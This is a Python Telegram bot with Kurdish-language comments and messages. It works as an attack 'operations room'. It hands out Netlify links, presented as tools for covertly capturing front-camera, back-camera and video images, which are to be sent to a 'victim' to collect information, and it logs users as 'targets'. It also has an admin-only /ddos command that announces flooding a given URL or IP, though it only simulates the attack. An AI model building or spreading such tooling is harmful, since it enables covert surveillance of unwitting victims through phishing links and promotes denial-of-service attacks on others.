import os
import sys
import time
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# خوێندنەوەی تووکنەکان و ئایدییەکان لە ژینگەی سێرڤەرەوە (Secrets)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER_ID = os.environ.get("OWNER_ID")  # ئایدی ئۆوێنەر لە secret دادەنرێت
ADMIN_IDS = os.environ.get("ADMIN_IDS", "").split(",")  # لیستی ئایدیی ئەدمنەکان بە کاما جیا دەکرێنەوە

if not BOT_TOKEN:
    print("[!] ERROR: BOT_TOKEN is not set in the environment variables!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# پاککردنەوەی لیستەکە لە سپەیس
ADMIN_IDS = [int(admin_id.strip()) for admin_id in ADMIN_IDS if admin_id.strip().isdigit()]
if OWNER_ID and OWNER_ID.isdigit():
    OWNER_ID = int(OWNER_ID)
else:
    OWNER_ID = None

# لینکەکانت بۆ بەشی هێرشبەر
LINKS = {
    "front": "https://genuine-bublanina-6ef92a.netlify.app/",
    "back": "https://majestic-cannoli-a2db6b.netlify.app/",
    "video": "https://splendorous-toffee-5f8076.netlify.app",
    "all": "https://jolly-entremet-36bd78.netlify.app"
}

# پشکنینی ئەوەی ئایا بەکارهێنەر ئەدمنە یان ئۆوێنەرە
def is_authorized(user_id):
    if OWNER_ID and user_id == OWNER_ID:
        return True
    if user_id in ADMIN_IDS:
        return True
    return False

# تابلۆی پێشوازیکردنی شاهانە
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user = message.from_user
    user_name = user.first_name
    username = f"@{user.username}" if user.username else "N/A"
    user_id = user.id
    
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 🚨 New Target Connected -> Name: {user_name} | ID: {user_id} | Username: {username}")
    
    welcome_text = (
        f"💀 **بەخێر بێیت بۆ ژووری ئۆپەراسیۆنە تیتانیۆمییەکان، {user_name}!** 💀\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ **سیستەمی کۆکردنەوەی زانیاری و هێرشەکان:**\n"
        "• دۆخی سێرڤەر: `ONLINE & SECURE`\n"
        "• ئاستی پارێزربی: `MILITARY-GRADE`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 بۆ وەرگرتنی لینکەکان، کلیک لەسەر دوگمەی خوارەوە بکە:"
    )
    
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🔗 وەرگرتنی لینکی کامێرا", callback_data="get_camera_menu"),
        InlineKeyboardButton("🛡️ دەربارەی تیتانیۆم کۆر", callback_data="about")
    )
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

# بەڕێوەبردنی کلیلی سیستەمەکان
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "get_camera_menu":
        bot.answer_callback_query(call.id, "فەرموو جۆری هێرشەکە هەڵبژێرە!")
        
        menu_text = "🎯 **فەرموو یەکێک لە جۆرەکان هەڵبژێرە بۆ وەرگرتنی لینکەکەی:**"
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("📸 کامێرای پێشەوە", callback_data="link_front"),
            InlineKeyboardButton("📸 کامێرای پشتەوە", callback_data="link_back"),
            InlineKeyboardButton("🎥 ٨ چرکە ڤیدیۆ گرتن", callback_data="link_video"),
            InlineKeyboardButton("💎 هەمووی پێکەوە (Ultimate)", callback_data="link_all")
        )
        
        bot.send_message(call.message.chat.id, menu_text, reply_markup=markup, parse_mode="Markdown")

    elif call.data.startswith("link_"):
        key = call.data.split("_")[1]
        link = LINKS.get(key, "https://google.com")
        
        titles = {
            "front": "کامێرای پێشەوە",
            "back": "کامێرای پشتەوە",
            "video": "٨ چرکە ڤیدیۆ",
            "all": "هەمووی پێکەوە (Ultimate)"
        }
        
        target_name = titles.get(key, "لینک")
        bot.answer_callback_query(call.id, f"لینکی {target_name} ئامادە کرا!")
        
        response_text = (
            f"🔗 لینکەکە بۆ قوربانی بنێرە بۆ دەستکەوتنی زانیاری ({target_name}):\n\n"
            f"`{link}`\n\n"
            "👇 **پەنجە بنێ بە لینک بۆ کۆپی کردن**"
        )
        
        bot.send_message(call.message.chat.id, response_text, parse_mode="Markdown")

    elif call.data == "about":
        bot.answer_callback_query(call.id, "دەربارەی تیتانیۆم کۆر")
        about_msg = (
            "💀 **دەربارەی سیستەمی تیتانیۆم کۆر** 💀\n\n"
            "ئەم بۆتە وەک ژووری ئۆپەراسیۆن و کۆنتڕۆڵی تۆ کار دەکات بۆ بەڕێوەبردنی هێرشەکان و کۆکردنەوەی زانیاری."
        )
        bot.send_message(call.message.chat.id, about_msg, parse_mode="Markdown")

# فەرمانی تایبەت بە DDoS Attack (تەنها بۆ Owner و Admin)
@bot.message_handler(commands=['ddos'])
def ddos_command(message):
    user_id = message.from_user.id
    
    # پشکنین کە ئایا کەسەکە مۆڵەتی هەیە یان نەخێر
    if not is_authorized(user_id):
        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی بەکارهێنانی ئەم فەرمانەت نییە.** تەنها ئۆوێنەر و ئەدمنەکان دەتوانن هێرش دەستپێبکەن.")
        return

    # وەرگرتنی ئامانجەکە (IP یاخود Domain) لە پەیامەکەدا
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ **تکایە ئامانجەکەی بنووسە!**\nنموونە: `/ddos https://target.com` یان `/ddos 192.168.1.1`", parse_mode="Markdown")
        return

    target = args[1]
    
    # ناردنی پەیامی دەستپێکردنی هێرش
    attack_msg = (
        f"🔥 **[DDOS ATTACK INITIATED]** 🔥\n\n"
        f"🎯 **ئامانج:** `{target}`\n"
        f"⚡ **دۆخ:** `FLOODING PACKETS...`\n"
        f"👤 **بەرپرسی هێرش:** `{message.from_user.first_name}`\n\n"
        "⚙️ سێرڤەرەکان لە کارکردن بەردەوامن و هێرشەکە دەستی پێکرد!"
    )
    
    msg = bot.reply_to(message, attack_msg, parse_mode="Markdown")
    
    # لێرەدا دەتوانیت لۆژیکی پەخشی هێرشەکە (Socket/Requests Flooding) دابنێیت ئەگەر پێویست بکات
    # بۆ نموونە სიმوڵەیشنی تەواوبوونی هێرش دوای چەند چرکەیەک:
    time.sleep(3)
    bot.edit_message_text(
        f"💥 **[ATTACK STATUS: RUNNING]** 💥\n\n🎯 **ئامانج:** `{target}`\n🚀 **بارودۆخ:** هێرشی چڕ بە سەرکەوتوویی لەسەر ئامانجەکە چڕبۆوە!",
        chat_id=message.chat.id,
        message_id=msg.message_id,
        parse_mode="Markdown"
    )

if __name__ == '__main__':
    print("==========================================")
    print("💀 SECURE TITANIUM OMEGA BOT + DDOS 💀")
    print("==========================================")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"[!] Connection Error Handled: {e}")
            time.sleep(3)
